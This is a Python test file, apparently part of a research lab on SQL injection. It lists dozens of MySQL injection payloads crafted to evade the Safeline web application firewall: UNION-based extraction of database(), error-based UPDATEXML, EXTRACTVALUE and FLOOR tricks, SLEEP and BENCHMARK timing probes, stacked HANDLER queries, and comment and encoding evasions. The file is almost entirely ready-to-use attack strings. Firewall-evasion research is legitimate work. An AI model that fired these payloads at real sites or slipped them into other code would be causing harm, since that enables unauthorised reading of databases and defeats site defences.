"""
bypass_lab/test_mysql.py
=========================
MySQL-specific bypass techniques — obscure syntax, rarely-used functions,
and parser quirks that Safeline's ML may not have been trained on.
"""
import sys
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from bypass_lab.verify import run_suite, PLAIN, WAF

MARKERS = "'SEQSQLI_START','SEQSQLI_END'"

cases_syntax = [
    # --- No-whitespace UNION using parentheses ---
    ("union+paren no space",
     "-1'UNION(SELECT database(),{M})-- -".format(M=MARKERS)),
    ("union+paren+case",
     "-1'uNiOn(sElEcT database(),{M})-- -".format(M=MARKERS)),

    # --- MySQL DUAL table ---
    ("union select from dual",
     f"-1' UNION SELECT database(),{MARKERS} FROM DUAL-- -"),

    # --- MySQL-specific numeric literals ---
    ("leading dot float",
     f"-1. UNION SELECT database(),{MARKERS}-- -"),
    ("negative float",
     f"-1.0' UNION SELECT database(),{MARKERS}-- -"),

    # --- Function synonyms Safeline might not know ---
    ("MID instead of SUBSTRING",
     f"1' AND MID(database(),1,1)='s'-- -"),
    ("SUBSTR instead of SUBSTRING",
     f"1' AND SUBSTR(database(),1,1)='s'-- -"),
    ("ORD instead of ASCII",
     f"1' AND ORD(MID(database(),1,1))>96-- -"),
    ("LPAD extraction",
     f"-1' UNION SELECT LPAD(database(),32,'0'),{MARKERS}-- -"),
    ("ELT function",
     f"-1' UNION SELECT ELT(1,database()),{MARKERS}-- -"),
    ("MAKE_SET function",
     f"-1' UNION SELECT MAKE_SET(1,database()),{MARKERS}-- -"),
    ("EXPORT_SET function",
     f"-1' UNION SELECT EXPORT_SET(1,database(),'no',',',1),{MARKERS}-- -"),

    # --- Conditional expressions ---
    ("IF extraction",
     f"-1' UNION SELECT IF(1=1,database(),'no'),{MARKERS}-- -"),
    ("CASE WHEN extraction",
     f"-1' UNION SELECT CASE WHEN 1=1 THEN database() ELSE 'no' END,{MARKERS}-- -"),
    ("IFNULL extraction",
     f"-1' UNION SELECT IFNULL(database(),'no'),{MARKERS}-- -"),

    # --- String construction alternatives ---
    ("CONCAT_WS",
     f"-1' UNION SELECT CONCAT_WS('',database()),{MARKERS}-- -"),
    ("CHAR function extraction",
     f"-1' UNION SELECT CHAR(115,101,99,117,114,105,116,121),{MARKERS}-- -"),
    ("REVERSE trick",
     f"-1' UNION SELECT REVERSE(REVERSE(database())),{MARKERS}-- -"),

    # --- MySQL NULL tricks ---
    ("UNION NULL+coerce",
     f"-1' UNION SELECT NULL,{MARKERS}-- -"),
    ("coalesce database",
     f"-1' UNION SELECT COALESCE(NULL,database()),{MARKERS}-- -"),

    # --- MySQL-specific operators ---
    ("XOR boolean",
     f"1' AND 1 XOR 0-- -"),
    ("DIV operator",
     f"1' AND 1 DIV 1=1-- -"),
    ("MOD operator",
     f"1' AND 1 MOD 2=1-- -"),

    # --- MySQL @variable trick ---
    ("@var assignment",
     f"-1' UNION SELECT @a:=database(),{MARKERS}-- -"),

    # --- MySQL regex ---
    ("REGEXP boolean",
     f"1' AND database() REGEXP 's'-- -"),
    ("RLIKE boolean",
     f"1' AND database() RLIKE 's'-- -"),

    # --- Unusual comment terminators ---
    ("hash comment",
     f"-1' UNION SELECT database(),{MARKERS}#"),
    ("hash+newline comment",
     f"-1' UNION SELECT database(),{MARKERS}%23%0a"),
    ("inline comment terminator",
     f"-1' UNION SELECT database(),{MARKERS}/*"),

    # --- Numeric context tricks ---
    ("hex string X notation",
     f"1' AND X'31'=1-- -"),
    ("binary notation",
     f"1' AND 0b1=1-- -"),

    # --- MySQL HANDLER (non-UNION data extraction) ---
    ("HANDLER statement",
     f"1'; HANDLER users OPEN; HANDLER users READ FIRST; HANDLER users CLOSE-- -"),
]


cases_functions = [
    # Obscure MySQL 5.7 functions
    ("WEIGHT_STRING",
     f"1' AND WEIGHT_STRING(database())>0-- -"),
    ("UPDATEXML error-based",
     f"1' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"),
    ("EXTRACTVALUE error-based",
     f"1' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"),
    ("FLOOR error-based",
     f"1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    ("NAME_CONST error-based",
     f"1' AND 1=NAME_CONST(database(),1)-- -"),
    ("UUID_SHORT timing side-channel",
     f"1' AND UUID_SHORT()>0-- -"),
    ("SLEEP time-based",
     f"1' AND SLEEP(0)-- -"),
    ("BENCHMARK time-based",
     f"1' AND BENCHMARK(1,MD5('a'))-- -"),
]


if __name__ == "__main__":
    run_suite("MySQL Syntax & Function Bypass", cases_syntax)
    run_suite("MySQL Error/Blind Functions", cases_functions)
